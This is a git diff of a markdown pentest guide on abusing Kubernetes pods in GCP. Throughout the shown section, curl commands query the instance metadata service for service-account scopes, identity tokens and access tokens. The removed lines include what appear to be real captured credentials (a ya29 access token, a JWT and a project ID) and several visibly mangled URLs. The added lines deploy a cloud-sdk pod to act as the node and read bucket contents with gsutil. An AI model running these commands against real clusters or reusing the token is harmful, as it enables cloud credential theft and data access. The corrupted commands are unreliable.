@@ -74,13 +74,13 @@ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME
 ### GCP
 Test to see if you have access to the metadata service:
 ```
-curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/service-acc://www.example.com'
+curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/'
 126817330210-compute@developer.gserviceaccount.com/
 default/
 ```
 
-If you do, you can proceed with the next few commands, but I suggest deploying another pod with the gcloud image.  Using this image on an pod that has access to the metadata service allows gives you gcloud access assuming the role assigned to the node. 
 
+**See permissions assigned to default service account**
 ```
 curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
 https://www.googleapis.com/auth/devstorage.read_only
@@ -89,20 +89,42 @@ https://www.googleapis.com/auth/monitoring
 https://www.googleapis.com/auth/servicecontrol
 https://www.googleapis.com/auth/service.management.readonly
 https://www.googleapis.com/auth/trace.append
-
-curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id -s
-ultra-physics-269916
-
-curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/servimail -s
-126817330210-compute@developer.gserviceaccount.com
-
- curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://www.example.com'
-eyJhbGciOiJSUzI1NiIsImtpZCI6IjZhZGMxMDFjYzc0OThjMDljMDEwZGMzZDUxNzZmYTk3Yzk2MjdlY2IiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJod[REDACTED]
-
-
-curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/coance/service-accounts/default/token"      
-{"access_token":"ya29.c.KpcB6AdLfSYjR7UFotbqZNjLEPTkCGxCJOr7SWjMmyDAwe7InN8QGfeJnQZlpDytvKLgWUDl_0AxEtVciZ-IKlkfgio4jag9_z9Jv83K4yiNnIGGqAdoZL7EVWhWlSlkfgDRazvXir3aPZKtqLKxXlf5p9XKdhWbDBiSZovv_oo81LAAhXVzYfcWQ","expires_in":2792,"token_type":"Bearer"}
 ```
+
+If you can query the metadata service, you can proceed with curl, but I suggest deploying another pod with the `gcr.io/google.com/cloudsdktool/cloud-sdk:latest` image. This allows you to use `gcloud` and `gsutil` as the node.
+
+Something like this: 
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nothing-allowed-gcloud-pod
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: nothing-allowed-pod
+    image: gcr.io/google.com/cloudsdktool/cloud-sdk:latest
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+```
+
+**Example: Find buckets, list objects, and read file contents**
+```
+root@nothing-allowed-gcloud-pod:/# gsutil ls
+gs://playground-test123/
+
+root@nothing-allowed-gcloud-pod:/# gsutil ls gs://playground-test123
+gs://playground-test123/luggage_combination.txt
+
+root@nothing-allowed-gcloud-pod:/# gsutil cat gs://playground-test123/luggage_combination.txt
+12345
+```
+
+An awesome GCP privesc reference: https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
+
+
 
 ## Overly permissive service account
 If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.
@@ -121,6 +143,7 @@ Your pod will be able to see a different view of the network services running wi
 
 # Reference(s): 
 
+* https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
 * https://securekubernetes.com/
 * https://madhuakula.com/kubernetes-goat/
 * https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/
